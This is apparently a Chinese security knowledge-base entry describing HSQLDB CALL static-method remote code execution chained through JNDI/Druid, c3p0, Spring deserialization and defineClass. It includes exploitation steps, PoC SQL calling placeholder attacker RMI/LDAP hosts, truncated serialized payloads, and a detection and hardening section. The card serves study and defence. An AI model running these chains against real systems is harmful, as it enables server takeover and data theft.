---
id: web-java-component-hsqldb-call-static-method-rce
title: HSQLDB CALL 任意静态方法：JDBC 连接内串联 JNDI、c3p0/Spring 二次反序列化与 defineClass RCE
type: scenario
domain: web
path: web/java/component
technique: hsqldb-call-static-method-jdbc-rce
aliases:
- HSQLDB CALL 静态方法
- Hsql CALL
- HsqldbCustomJdbc
- HsqldbJndiJdbc
- HsqldbC3p0HexJdbc
- HsqldbDefineClassJdbc
- HsqldbHexDeserJdbc
- CREATE FUNCTION EXTERNAL NAME CLASSPATH
tags:
- java
- hsqldb
- jdbc
- rce
- jndi
- deserialization
- c3p0
- spring
- defineclass
- druid
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:39+08:00'
  notes: 已对照原文与 img03-13 核对：CREATE FUNCTION/CALL 静态方法、java.rmi.Naming.list、InitialContext.doLookup、C3P0ImplUtils.parseUserOverridesAsString、Spring SerializationUtils.deserialize、ReflectUtils.defineClass 与 JNDIMap/Druid/Hsqldb*Jdbc 投递链一致；JDK11+Jackson 计算器为原文实拍，c3p0/Spring 变体仅给链未给执行栈；dedup 与 ImmutableSetMultimap HSQL 卡为同 sink 不同入口，非同一链；未复跑。
---

## 一句话结论

HSQLDB 的 SQL 层可以用 `CALL "类.静态方法"(参数)`（或先 `CREATE FUNCTION ... EXTERNAL NAME 'CLASSPATH:类.方法'` 再 `CALL`）反射调用 classpath 上任意 public static 方法；当攻击者能让目标应用连接受控的 JDBC URL 或执行受控的连接初始化 SQL（典型投递是 JNDI→LDAP Reference→DruidDataSourceFactory→DruidDataSource 的 `initConnectionSqls`），就能串联 `InitialContext.doLookup`（JNDI）、c3p0 `parseUserOverridesAsString` 与 Spring `SerializationUtils.deserialize`（二次反序列化）、Spring `ReflectUtils.defineClass`（字节码定义）等 sink，最终 RCE。

## 原理

- HSQLDB 支持在 SQL 中调用 Java 静态方法，有两种写法：
  - 自定义函数绑定：`CREATE FUNCTION rce(VARCHAR(80)) RETURNS VARCHAR(80) NO SQL LANGUAGE JAVA EXTERNAL NAME 'CLASSPATH:java.rmi.Naming.list';` 然后 `CALL rce('rmi://attacker:2333/')`；
  - 直接调用：`CALL "java.rmi.Naming.list"('rmi://attacker:2333/a')`。
- 攻击者控制 JDBC URL 或连接初始化 SQL 后，把上述 SQL 注入目标连接（例如 Druid 连接池的 `initConnectionSqls` 在初始化连接时执行），HSQLDB 用反射解析类名与方法名并调用指定 public static 方法。限制是只能调用静态方法，不能直接 `new` 实例。
- 可复用的静态方法原语：
  1. `java.rmi.Naming.list(String)`：发起 RMI 连接，用于验证出网或作为 JNDI 前置；
  2. `javax.naming.InitialContext.doLookup(String/Name)`：静态方法内部执行 `new InitialContext().lookup(name)`，把 HSQL CALL 变成 JNDI 注入触发点，由恶意 LDAP/RMI 返回 Reference 或序列化 gadget；
  3. `com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString(String)`：截取 `HexAsciiSerializedMap:` 后的十六进制串，经 `SerializableUtils.fromByteArray` 调用 `ObjectInputStream.readObject()`，形成二次反序列化；
  4. `org.springframework.util.ReflectUtils.defineClass(String, byte[])`（文章写法；Spring 重打包 CGLIB 的 `ReflectUtils` 提供同名重载，实际包名随 Spring 版本而异）：把字节码定义为类，文章配合 `Base64Utils.decodeFromString` 嵌套调用解码 Base64；
  5. `org.springframework.util.SerializationUtils.deserialize(byte[])`：`ObjectInputStream.readObject()` 二次反序列化，可用 `X'<hex>'` 字面量传入。
- 为什么成立：HSQLDB 的 SQL 执行器把 `CALL` 中带引号的类方法名当作 Java 反射目标解析，不校验方法语义；静态方法已足够完成 JNDI 查找、反序列化与类定义。二次反序列化和类定义都发生在目标 JVM 内，不依赖 HSQLDB 服务端配合。
- 文章的完整投递：目标存在 JNDI lookup，攻击者用 JNDIMap 起恶意 LDAP 服务，返回 `JNDIReferencePayload`（`javax.naming.Reference`）→ 本地 `DruidDataSourceFactory` 按 Reference 属性创建 `DruidDataSource`（`driverClassName=org.hsqldb.jdbcDriver`，URL 指向 HSQLDB）→ `initConnectionSqls` 中放入 `CALL ...`；Druid 初始化连接时由 HSQLDB 执行 SQL。

## 触发条件

- 攻击者可控制目标使用的 JDBC URL 或连接初始化 SQL（JNDI Reference 属性、数据源测试连接、配置注入、SQL 注入等）。
- classpath 有 HSQLDB 驱动，且 URL/流程会让 HSQLDB 执行攻击者 SQL（如 `jdbc:hsqldb:mem:` 或 file 模式配合 `initConnectionSqls`）。
- 对应 sink 的依赖存在：
  - JNDI 变体：JDK 自带 JNDI/RMI，目标可出网访问攻击者 LDAP/RMI；
  - c3p0 变体：classpath 有 c3p0；
  - Spring 反序列化变体：classpath 有 Spring（`SerializationUtils`）与可用的原生反序列化 gadget；
  - defineClass 变体：classpath 有 Spring 的 `ReflectUtils`/`Base64Utils`。
- 高版本 JDK 需配合 JNDI 本地工厂绕过或适配的反序列化 gadget；存在 JEP 290/类白名单时需相应绕过。

## 利用步骤

1. 确认 JDBC URL 或初始化 SQL 可控、HSQLDB 驱动存在；枚举 classpath（Druid、c3p0、Spring、Jackson 等）。
2. 选择 sink 并构造 SQL：
   - RMI/JNDI：`CALL "java.rmi.Naming.list"('rmi://attacker:2333/')` 或 `CALL "javax.naming.InitialContext.doLookup"('ldap://attacker:1389/xxx')`；
   - c3p0：`call "com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString"('HexAsciiSerializedMap:<hex>')`；
   - Spring 反序列化：`call "org.springframework.util.SerializationUtils.deserialize"(X'<hex>')`；
   - Spring defineClass：`call "org.springframework.util.ReflectUtils.defineClass"('<类名>', ...Base64 解码字节码...)`。
3. 通过可控 JDBC URL 或 `initConnectionSqls` 让连接池在初始化连接时执行上述 SQL；也可在已建立的 HSQLDB 会话中直接执行。
4. JNDI 变体：恶意 LDAP 返回 Reference/gadget，文章在 JDK11 + Jackson 环境下用 Jackson gadget → TemplatesImpl 弹出计算器；LDAP 日志可见 `Deserialize/Jackson/Command/...` 与 `Sending serialized gadget`。
5. 二次反序列化变体：把 Jackson/原生链字节序列化后转十六进制，嵌入 c3p0 `HexAsciiSerializedMap:` 或 Spring `X'...'`；无回显时用 DNS/HTTP 外带或写文件。

## PoC

自定义函数与直接调用（原文）：

```sql
create function rce(VARCHAR(80))
    returns VARCHAR(80)
    no sql
    language java
    external name 'CLASSPATH:java.rmi.Naming.list'
;
CALL rce('rmi://attacker:2333/')
```

```sql
CALL "java.rmi.Naming.list"('rmi://127.0.0.1:2333/a')
```

c3p0 二次反序列化（写入 `initConnectionSqls`）：

```sql
call "com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString"('HexAsciiSerializedMap:aced0005...')
```

Spring 反序列化：

```sql
call "org.springframework.util.SerializationUtils.deserialize"(X'aced0005...')
```

Spring defineClass（原文形态，内层为 Base64 解码调用）：

```sql
call "org.springframework.util.ReflectUtils.defineClass"('org.apache.beanutils.coyote.cfg.PackageVersionxxxx',"use org.springframework.util.Base64Utils.decodeFromString"('yv66vg...'))
```

投递侧（文章工具链）：`JNDIReferencePayload`（LDAP Reference）→ `DruidJdbcAttack`（`DruidDataSourceFactory`，`driverClassName=org.hsqldb.jdbcDriver`）→ `HsqldbCustomJdbc`/`HsqldbJndiJdbc`/`HsqldbC3p0HexJdbc`/`HsqldbDefineClassJdbc`/`HsqldbHexDeserJdbc`（把 `CALL` 放进连接初始化 SQL）。受害者执行 `InitialContext.lookup("ldap://attacker:50389/xxx")` 后，由 Druid 初始化连接触发 HSQLDB 执行 SQL。

## 变体与关联

- 静态方法 sink 可替换：任何 public static 方法都可被 `CALL` 调用；可组合 `Class.forName`、`ReflectUtils` 等反射原语扩展参数构造能力。
- 二次反序列化 gadget 可换 Jackson、CommonsCollections、TemplatesImpl 等；文章使用 Jackson 原生链并用 Spring AOP 代理适配高版本 JDK。
- 投递入口可换：Druid `initConnectionSqls`、数据源工厂 Reference、任何能执行受控 SQL 的 HSQLDB 会话/注入点。
- 关联：[[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]（同一 JNDI→Druid→JDBC 投递，但 sink 为 H2 INIT）；[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]] 与 [[web-java-deserialization-immutablesetmultimap-nullkey-checkentrynotnull-tostring]]（原生反序列化入口触发 DruidXADataSource + HSQL CALL 二次反序列化，sink 相同、入口不同）；[[web-java-component-h2-jre-only-create-alias-static-method-rce]]（H2 静态方法绑定同类思路）；[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]（JNDI 本地工厂 + JDBC）。
- 边界：classpath 无 HSQLDB、无法控制 URL/初始化 SQL、对应依赖缺失、JDK 模块或反序列化过滤器拦截、目标不出网时链断。defineClass 变体只完成类定义，是否立即触发静态初始化/构造逻辑取决于实现与后续调用，文章未给出该变体的执行栈与命令回显，需实际环境验证。

## 检测与防御

- 检测：HSQLDB SQL 日志或连接初始化 SQL 中出现 `CALL "`、`CLASSPATH:`、`java.rmi.Naming`、`InitialContext.doLookup`、`C3P0ImplUtils.parseUserOverridesAsString`、`SerializationUtils.deserialize`、`ReflectUtils.defineClass`、`Base64Utils.decodeFromString` 等特征。
- 检测：JNDI Reference 的 `factoryClassName` 指向 Druid/DataSource 工厂且属性中 `url` 为 `jdbc:hsqldb:`；随后出现异常 JDBC 连接与子进程创建。
- 防御：禁止用户控制 JDBC URL、驱动类与连接初始化 SQL；数据源配置按驱动、主机、属性白名单校验；移除不必要的 HSQLDB、c3p0、Druid 依赖。
- 加固：启用 JEP 290 全局反序列化过滤器；用 `jdk.jndi.object.factoriesFilter` 限制本地工厂；禁止把外部输入传给 `InitialContext.lookup`；限制应用出站访问 LDAP/RMI/HTTP。
- HSQLDB 侧：生产环境避免使用允许任意 `CALL` 静态方法的连接配置；禁用或限制 `CREATE FUNCTION ... EXTERNAL NAME`，对 `CALL` 目标做白名单。
